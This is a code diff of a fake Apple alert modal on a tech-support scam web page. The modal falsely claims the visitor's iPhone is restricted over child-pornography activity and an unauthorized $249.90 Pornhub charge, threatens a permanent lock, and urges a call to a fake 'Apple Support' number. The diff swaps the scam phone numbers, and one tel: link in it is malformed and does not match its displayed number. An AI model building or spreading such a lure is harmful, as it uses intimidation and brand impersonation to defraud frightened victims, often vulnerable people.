@@ -114,12 +114,12 @@ newModal.innerHTML = `
         <div class="modal-content" id="applealertmodeltwo">
             <div class="modal-body text-center">
                 <div class="alert-text">
-                    Your Iphone Temporarily Restricted due to illegal Child Pornography activity. You have purchased a Pornhub subscription of $249.90. The payment was processed from [<span class="user-city" style="font-weight:700;">Loading...</span>]. This is an unauthorized transaction. Your account has been locked because of a suspicious payment activity. Verify your account with Apple Support <a href="tel:+1-877-489-3932">+1-877-489-3932</a> to unlock it, otherwise your Iphone will be Permanently Locked.
+                    Your Iphone Temporarily Restricted due to illegal Child Pornography activity. You have purchased a Pornhub subscription of $249.90. The payment was processed from [<span class="user-city" style="font-weight:700;">Loading...</span>]. This is an unauthorized transaction. Your account has been locked because of a suspicious payment activity. Verify your account with Apple Support <a href="tel:+1-8-489-3932">+1-888-884-3096</a> to unlock it, otherwise your Iphone will be Permanently Locked.
                 </div>
 
                 <div class="text-end gap-4 mt-3 actionbtn">
-                    <a href="tel:+1-877-489-3932" class="me-2 bg-primary">Call +1-877-489-3932</a>
-                    <a href="tel:+1-877-489-3932" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                    <a href="tel:+1-888-884-3096" class="me-2 bg-primary">Call +1-888-884-3096</a>
+                    <a href="tel:+1-888-884-3096" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
                 </div>
             </div>
         </div>
